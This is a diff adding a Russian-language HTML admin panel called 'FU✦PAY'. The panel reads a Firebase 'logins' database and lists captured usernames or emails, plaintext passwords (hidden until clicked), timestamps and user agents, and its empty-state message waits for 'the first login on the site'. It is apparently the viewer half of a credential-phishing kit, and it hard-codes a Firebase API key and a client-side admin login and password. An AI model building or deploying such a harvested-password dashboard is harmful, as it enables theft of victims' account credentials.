@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>FU✦PAY — Админ панель</title>
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@600;800&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #0e0f13;
+      --surface: #16181f;
+      --border: #2a2d38;
+      --accent: #f5a623;
+      --text: #e8eaf0;
+      --muted: #6b7280;
+      --success: #22c55e;
+      --danger: #ef4444;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'DM Sans', sans-serif;
+      min-height: 100vh;
+    }
+
+    /* LOGIN GATE */
+    #gate {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: radial-gradient(ellipse at 50% 0%, rgba(245,166,35,0.07) 0%, transparent 70%);
+    }
+    .gate-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 40px;
+      width: 100%;
+      max-width: 360px;
+      box-shadow: 0 24px 64px rgba(0,0,0,0.4);
+    }
+    .gate-card h2 {
+      font-family: 'Syne', sans-serif;
+      font-size: 22px;
+      margin-bottom: 6px;
+    }
+    .gate-card p { font-size: 13px; color: var(--muted); margin-bottom: 28px; }
+    .gate-card input {
+      width: 100%;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 13px 16px;
+      color: var(--text);
+      font-family: 'DM Sans', sans-serif;
+      font-size: 15px;
+      outline: none;
+      margin-bottom: 12px;
+      transition: border-color 0.2s;
+    }
+    .gate-card input:focus { border-color: var(--accent); }
+    .gate-card input::placeholder { color: var(--muted); }
+    .gate-btn {
+      width: 100%;
+      padding: 13px;
+      background: var(--accent);
+      color: #0e0f13;
+      font-family: 'Syne', sans-serif;
+      font-weight: 700;
+      font-size: 15px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .gate-btn:hover { background: #f0b93a; }
+    .gate-error { color: var(--danger); font-size: 13px; margin-top: 10px; display: none; }
+
+    /* ADMIN PANEL */
+    #panel { display: none; }
+
+    header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 32px;
+      border-bottom: 1px solid var(--border);
+      background: var(--surface);
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    .logo {
+      font-family: 'Syne', sans-serif;
+      font-weight: 800;
+      font-size: 20px;
+    }
+    .logo span { color: var(--accent); }
+    .logo sub { font-size: 11px; color: var(--muted); font-weight: 400; margin-left: 6px; vertical-align: middle; }
+
+    .header-right { display: flex; align-items: center; gap: 12px; }
+    .badge {
+      background: var(--accent);
+      color: #0e0f13;
+      font-family: 'Syne', sans-serif;
+      font-weight: 700;
+      font-size: 12px;
+      padding: 4px 10px;
+      border-radius: 20px;
+    }
+    .logout-btn {
+      background: none;
+      border: 1px solid var(--border);
+      color: var(--muted);
+      padding: 6px 14px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 13px;
+      transition: border-color 0.2s, color 0.2s;
+    }
+    .logout-btn:hover { border-color: var(--danger); color: var(--danger); }
+
+    main { padding: 32px; max-width: 1100px; margin: 0 auto; }
+
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 16px;
+      margin-bottom: 32px;
+    }
+    .stat-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px 24px;
+      animation: fadeUp 0.4s ease both;
+    }
+    .stat-card:nth-child(2) { animation-delay: 0.05s; }
+    .stat-card:nth-child(3) { animation-delay: 0.1s; }
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(16px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .stat-label { font-size: 12px; color: var(--muted); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+    .stat-value { font-family: 'Syne', sans-serif; font-size: 28px; font-weight: 800; color: var(--accent); }
+
+    .table-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 16px;
+    }
+    .table-header h3 { font-family: 'Syne', sans-serif; font-size: 18px; }
+    .refresh-btn {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      color: var(--text);
+      padding: 8px 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 13px;
+      transition: border-color 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .refresh-btn:hover { border-color: var(--accent); }
+
+    .table-wrap {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      overflow: hidden;
+    }
+    table { width: 100%; border-collapse: collapse; }
+    thead th {
+      background: var(--bg);
+      padding: 14px 20px;
+      text-align: left;
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--muted);
+      font-weight: 500;
+      border-bottom: 1px solid var(--border);
+    }
+    tbody tr {
+      border-bottom: 1px solid var(--border);
+      transition: background 0.15s;
+      animation: fadeUp 0.3s ease both;
+    }
+    tbody tr:last-child { border-bottom: none; }
+    tbody tr:hover { background: rgba(245,166,35,0.04); }
+    tbody td {
+      padding: 14px 20px;
+      font-size: 14px;
+      vertical-align: middle;
+    }
+    .td-num { color: var(--muted); font-size: 12px; width: 40px; }
+    .td-user { font-weight: 500; }
+    .td-pass {
+      font-family: monospace;
+      letter-spacing: 1px;
+      color: var(--accent);
+      cursor: pointer;
+      user-select: none;
+      position: relative;
+    }
+    .td-pass .masked { display: inline; }
+    .td-pass .revealed { display: none; }
+    .td-pass.show .masked { display: none; }
+    .td-pass.show .revealed { display: inline; }
+    .td-time { color: var(--muted); font-size: 12px; }
+    .td-ua { color: var(--muted); font-size: 11px; max-width: 220px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+    .empty {
+      text-align: center;
+      padding: 60px;
+      color: var(--muted);
+      font-size: 14px;
+    }
+    .empty-icon { font-size: 40px; margin-bottom: 12px; }
+
+    .loading {
+      text-align: center;
+      padding: 60px;
+      color: var(--muted);
+    }
+    .spinner {
+      width: 28px;
+      height: 28px;
+      border: 2px solid var(--border);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      margin: 0 auto 12px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .eye-hint { font-size: 11px; color: var(--muted); margin-top: 4px; }
+  </style>
+</head>
+<body>
+
+<!-- LOGIN GATE -->
+<div id="gate">
+  <div class="gate-card">
+    <h2>FU<span style="color:var(--accent)">✦</span>PAY</h2>
+    <p>Вход в панель администратора</p>
+    <input type="text" id="adminLogin" placeholder="Логин" />
+    <input type="password" id="adminPass" placeholder="Пароль" />
+    <button class="gate-btn" onclick="checkAdmin()">Войти в панель</button>
+    <p class="gate-error" id="gateError">Неверный логин или пароль</p>
+  </div>
+</div>
+
+<!-- ADMIN PANEL -->
+<div id="panel">
+  <header>
+    <div class="logo">FU<span>✦</span>PAY <sub>admin</sub></div>
+    <div class="header-right">
+      <span class="badge" id="totalBadge">0 записей</span>
+      <button class="logout-btn" onclick="logout()">Выйти</button>
+    </div>
+  </header>
+
+  <main>
+    <div class="stats">
+      <div class="stat-card">
+        <div class="stat-label">Всего логинов</div>
+        <div class="stat-value" id="statTotal">—</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-label">Последний вход</div>
+        <div class="stat-value" id="statLast" style="font-size:16px; padding-top:6px;">—</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-label">Уникальных юзеров</div>
+        <div class="stat-value" id="statUniq">—</div>
+      </div>
+    </div>
+
+    <div class="table-header">
+      <h3>Попытки входа</h3>
+      <button class="refresh-btn" onclick="loadData()">
+        <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M1 4v6h6"/><path d="M23 20v-6h-6"/><path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4-4.64 4.36A9 9 0 0 1 3.51 15"/></svg>
+        Обновить
+      </button>
+    </div>
+
+    <div class="table-wrap">
+      <div id="tableContent" class="loading">
+        <div class="spinner"></div>
+        Загрузка данных...
+      </div>
+    </div>
+    <p class="eye-hint" style="margin-top:8px; text-align:right;">👁 Нажми на пароль чтобы показать</p>
+  </main>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyBMKuV2V-MsAIQo4XlthA59_zTH3vUCaqg",
+    authDomain: "fu-pay-bdefa.firebaseapp.com",
+    databaseURL: "https://fu-pay-bdefa-default-rtdb.firebaseio.com",
+    projectId: "fu-pay-bdefa",
+    storageBucket: "fu-pay-bdefa.firebasestorage.app",
+    messagingSenderId: "486996812011",
+    appId: "1:486996812011:web:0667a41b95bd66ea689eae"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  // ───── ADMIN PASSWORD ─────
+  // Смени на свой логин/пароль!
+  const ADMIN_LOGIN = "admin";
+  const ADMIN_PASS  = "fupay2024";
+  // ──────────────────────────
+
+  window.checkAdmin = () => {
+    const l = document.getElementById('adminLogin').value;
+    const p = document.getElementById('adminPass').value;
+    if (l === ADMIN_LOGIN && p === ADMIN_PASS) {
+      document.getElementById('gate').style.display = 'none';
+      document.getElementById('panel').style.display = 'block';
+      loadData();
+    } else {
+      document.getElementById('gateError').style.display = 'block';
+    }
+  };
+
+  window.logout = () => {
+    document.getElementById('gate').style.display = 'flex';
+    document.getElementById('panel').style.display = 'none';
+    document.getElementById('adminLogin').value = '';
+    document.getElementById('adminPass').value = '';
+  };
+
+  window.loadData = () => {
+    const container = document.getElementById('tableContent');
+    container.innerHTML = '<div class="loading"><div class="spinner"></div>Загрузка данных...</div>';
+
+    onValue(ref(db, 'logins'), (snapshot) => {
+      const data = snapshot.val();
+
+      if (!data) {
+        container.innerHTML = '<div class="empty"><div class="empty-icon">📭</div>Пока нет данных. Дождись первого входа на сайте.</div>';
+        updateStats(0, '—', 0);
+        return;
+      }
+
+      const entries = Object.entries(data).reverse(); // новые сверху
+      const uniq = new Set(entries.map(([,v]) => v.username)).size;
+      const last = entries[0]?.[1]?.time || '—';
+
+      updateStats(entries.length, last, uniq);
+
+      let rows = entries.map(([id, v], i) => {
+        const masked = '•'.repeat(Math.min(v.password?.length || 8, 12));
+        return `
+          <tr>
+            <td class="td-num">${entries.length - i}</td>
+            <td class="td-user">${escHtml(v.username || '—')}</td>
+            <td class="td-pass" onclick="this.classList.toggle('show')" title="Нажми чтобы показать">
+              <span class="masked">${masked}</span>
+              <span class="revealed">${escHtml(v.password || '—')}</span>
+            </td>
+            <td class="td-time">${v.time || '—'}</td>
+            <td class="td-ua">${escHtml(v.userAgent || '—')}</td>
+          </tr>`;
+      }).join('');
+
+      container.innerHTML = `
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Логин / Email</th>
+              <th>Пароль</th>
+              <th>Время</th>
+              <th>Устройство</th>
+            </tr>
+          </thead>
+          <tbody>${rows}</tbody>
+        </table>`;
+    });
+  };
+
+  function updateStats(total, last, uniq) {
+    document.getElementById('statTotal').textContent = total;
+    document.getElementById('statLast').textContent = last;
+    document.getElementById('statUniq').textContent = uniq;
+    document.getElementById('totalBadge').textContent = total + ' записей';
+  }
+
+  function escHtml(str) {
+    return String(str)
+      .replace(/&/g,'&amp;')
+      .replace(/</g,'&lt;')
+      .replace(/>/g,'&gt;')
+      .replace(/"/g,'&quot;');
+  }
+
+  // Enter to login
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Enter' && document.getElementById('gate').style.display !== 'none') {
+      window.checkAdmin();
+    }
+  });
+</script>
+
+</body>
+</html>
